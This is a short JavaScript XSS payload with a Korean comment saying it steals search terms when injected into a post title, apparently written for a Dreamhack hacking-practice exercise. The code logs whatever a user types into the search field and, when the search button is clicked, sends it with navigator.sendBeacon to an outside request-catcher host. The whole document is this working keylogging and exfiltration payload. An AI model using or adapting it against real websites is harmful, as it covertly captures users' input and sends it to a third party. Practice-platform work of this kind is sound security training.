// 글 제목 부분에 Payload를 입력하면 검색어를 탈취할 수 있다.
const search_word = document.getElementsByName("search_word")[0];
let search_keylog = "";

search_word.addEventListener("input", e => {
    search_keylog = e.target.value;
});

const search_btn = document.getElementsByTagName("button")[0];

search_btn.addEventListener("click", e => {
    //e.preventDefault();
    navigator.sendBeacon(
        "https://ainvyph.request.dreamhack.games",
        search_keylog
    );
});
